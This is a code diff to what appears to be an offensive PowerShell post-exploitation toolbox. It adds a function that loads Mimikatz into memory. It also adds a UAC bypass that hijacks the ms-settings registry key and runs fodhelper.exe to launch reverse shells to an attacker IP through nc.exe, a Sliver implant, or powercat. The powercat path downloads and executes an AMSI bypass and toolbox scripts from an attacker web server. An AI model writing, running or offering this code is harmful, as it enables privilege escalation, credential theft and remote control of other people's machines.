@@ -70,11 +70,19 @@
         [int]$method = 1
         Load-ScriptItemInMemory -item "tools/amzeebypass$($method).ps1"
     }
+
+    function Global:Bypass-UAC {
+        #Todo
+    }
     
     function Global:Load-Pview {
         Load-ScriptItemInMemory -item 'enum/powerview.ps1'
     }
     
+    function Global:Load-Mimikatz {
+        Load-ScriptItemInMemory -item 'tools/invoke-mimikatz.ps1'
+    }
+
     function Global:Start-LigoloAgent {
         param (
             $ip = $Global:AttackerIP,
@@ -112,11 +120,46 @@
              }
              'Powercat' {
                 Load-ScriptItemInMemory -item 'tools/powercat.ps1'
-                powercat -c $ip -p -$port -e cmd.exe
+                & powercat -c $ip -p $port -e cmd.exe
              }
         }
     }
     
+    function Global:Start-ShellUACBypassed {
+        param (
+        [string]$ip = $Global:AttackerIP,
+        [string]$port,
+        [string]$type = 'NC'
+        )
+        Set-Location $Global:ToolboxLocation
+        $location = $Global:ToolboxLocation
+        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(Default)" -value ".thm" -Force
+        Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value ''
+
+        switch ($type) {
+            'NC' {
+                #Todo test 
+                Get-SingleToolboxItem -item 'tools/nc.exe'
+                $string = "'$location\nc.exe' $ip $port -e cmd.exe"
+                Set-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(Default)" -Value $string -Force
+                & fodhelper.exe
+             }
+             'Sliver' {
+                #Todo test
+                Get-SingleToolboxItem -item 'tools/sliver8000.exe'
+                $string = "$location\sliver8000.exe"
+                Set-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(Default)" -Value $string -Force
+                & fodhelper.exe
+             }
+             'Powercat' {
+                #Todo test
+                $string = "powershell -ex bypass -cmd iex (iwr $($Global:WebServerRoot)/tools/amzeebypass1.ps1 -usebasic);iex (iwr $($Global:WebServerRoot)/gettoolbox.ps1 -usebasic);Load-ScriptItemInMemory -item 'tools/powercat.ps1';powercat -c $ip -p $port -e cmd.exe"
+                Set-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(Default)" -Value $string -Force
+                & fodhelper.exe
+             }
+        }
+    }
+
     function Global:Load-ScriptItemInMemory {
         param (
             [string]$item,
